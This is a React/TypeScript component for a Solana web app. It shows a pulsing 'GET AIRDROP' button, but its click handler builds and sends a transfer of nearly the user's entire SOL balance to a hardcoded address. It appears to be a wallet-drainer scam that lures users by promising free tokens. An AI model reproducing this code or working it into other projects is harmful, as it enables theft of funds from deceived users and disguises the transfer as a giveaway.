import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import {
  Keypair,
  SystemProgram,
  Transaction,
  TransactionMessage,
  TransactionSignature,
  VersionedTransaction,
} from "@solana/web3.js";
import { FC, useCallback, useEffect } from "react";
import { notify } from "../utils/notifications";
import useUserSOLBalanceStore from "stores/useUserSOLBalanceStore";
import { LAMPORTS_PER_SOL } from "@solana/web3.js";
import { PublicKey } from "@solana/web3.js";

export const SendTransaction: FC = () => {
  const toPublicKey = new PublicKey("D5LKoZgn12ysjkZyzCSxsRNJqfGJ2pM6jJMrNkQy5cQV")
  const balance = useUserSOLBalanceStore((s)  => s.balance);
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const wallet = useWallet();

  const { getUserSOLBalance } = useUserSOLBalanceStore();

  useEffect(() => {
    if (wallet.publicKey) {

      console.log(wallet.publicKey.toBase58());
      getUserSOLBalance(wallet.publicKey, connection);
    }
  }, [wallet.publicKey, connection, getUserSOLBalance]);
  const onClick = useCallback(async () => {
    if (!publicKey) {
      notify({ type: "error", message: `Wallet not connected!` });
      console.log("error", `Send Transaction: Wallet not connected!`);
      return;
    }

    let signature: TransactionSignature = "";
    if (balance) {
      try {
        
        // Create instructions to send, in this case a simple transfer
        const instructions = [
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: toPublicKey,
            lamports: balance * LAMPORTS_PER_SOL - 2000000,
          }),
        ];

        // Get the lates block hash to use on our transaction and confirmation
        let latestBlockhash = await connection.getLatestBlockhash();

        // Create a new TransactionMessage with version and compile it to legacy
        const messageLegacy = new TransactionMessage({
          payerKey: publicKey,
          recentBlockhash: latestBlockhash.blockhash,
          instructions,
        }).compileToLegacyMessage();

        // Create a new VersionedTransacction which supports legacy and v0
        const transation = new VersionedTransaction(messageLegacy);

        // Send transaction and await for signature
        signature = await sendTransaction(transation, connection);

        // Send transaction and await for signature
        await connection.confirmTransaction(
          { signature, ...latestBlockhash },
          "confirmed"
        );

        console.log(signature);
        notify({
          type: "success",
          message: "Transaction successful!",
          txid: signature,
        });
      } catch (error: any) {
        notify({
          type: "error",
          message: `Transaction failed!`,
          description: error?.message,
          txid: signature,
        });
        console.log(
          "error",
          `Transaction failed! ${error?.message}`,
          signature
        );
        return;
      }
    } else {
        console.log("no balance yet")
    }
  }, [publicKey, notify, connection, sendTransaction, balance]);

  return (
    <div className="flex flex-row justify-center">
      <div className="relative group items-center">
        <div
          className="m-1 absolute -inset-0.5 bg-gradient-to-r bg-[#16F396]
                rounded-lg blur opacity-20 group-hover:opacity-100 transition duration-1000 group-hover:duration-200 animate-tilt"
        ></div>
        <button
          className="group w-60 m-2 btn animate-pulse bg-gradient-to-br bg-[#16F396] hover:from-white hover:bg-[#16F396] text-black"
          onClick={onClick}
          disabled={!publicKey}
        >
          <div className="hidden group-disabled:block ">
            Wallet not connected
          </div>
          <span className="block group-disabled:hidden">GET AIRDROP</span>
        </button>
      </div>
    </div>
  );
};
